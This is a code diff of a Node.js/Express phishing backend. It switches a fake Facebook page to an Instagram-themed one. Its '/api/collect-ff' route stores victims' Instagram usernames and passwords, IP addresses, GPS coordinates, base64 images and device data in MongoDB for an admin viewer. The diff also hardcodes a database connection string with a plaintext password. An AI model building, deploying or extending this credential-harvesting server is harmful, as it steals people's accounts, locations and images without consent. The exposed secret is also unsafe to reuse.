@@ -11,11 +11,11 @@ app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 app.use(cors());
 app.use(express.static(path.join(__dirname)));
 
-// MongoDB Connection (Apna password yahan theek se daal lena bina < > ke)
-const MONGO_URI = "mongodb+srv://ktalpada484_db_user:sumit1123@cluster0.zjkzamc.mongodb.net/?appName=Cluster0";
+// MongoDB Connection
+const MONGO_URI = "mongodb+srv://ktalpada484_db_user:sumit123@cluster0.zjkzamc.mongodb.net/?appName=Cluster0";
 
 mongoose.connect(MONGO_URI)
-    .then(() => console.log("MongoDB Connected Successfully! Data is permanent."))
+    .then(() => console.log("MongoDB Connected Successfully!"))
     .catch(err => console.log("DB Connection Error: ", err));
 
 // Log Schema Definition
@@ -34,9 +34,9 @@ const FFLogSchema = new mongoose.Schema({
 
 const FFLogModel = mongoose.model('FFLog', FFLogSchema);
 
-// Routes for Pages
+// Serve index.html on root route
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'facebook.html'));
+    res.sendFile(path.join(__dirname, 'index.html'));
 });
 
 app.get('/viewer.html', (req, res) => {
@@ -53,20 +53,20 @@ app.post('/api/admin-login', (req, res) => {
     }
 });
 
-// Data Collect API Route
+// Data Collect API Route matching index.html fetch call
 app.post('/api/collect-ff', async (req, res) => {
     try {
-        const recordId = 'FF_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
+        const recordId = 'INSTA_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
         const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
         
         const newFFLog = new FFLogModel({
             id: recordId,
             ip: clientIp,
-            platform: req.body.platform || 'Unknown',
-            instagram_username: req.body.instagram_username || req.body.username || 'N/A',
-            instagram_password: req.body.instagram_password || req.body.password || 'N/A',
-            latitude: req.body.latitude || 'N/A',
-            longitude: req.body.longitude || 'N/A',
+            platform: req.body.platform || 'Instagram',
+            instagram_username: req.body.instagram_username || 'N/A',
+            instagram_password: req.body.instagram_password || 'N/A',
+            latitude: String(req.body.latitude || 'N/A'),
+            longitude: String(req.body.longitude || 'N/A'),
             image_base64: req.body.image_base64 || null,
             system: req.body.system || {}
         });
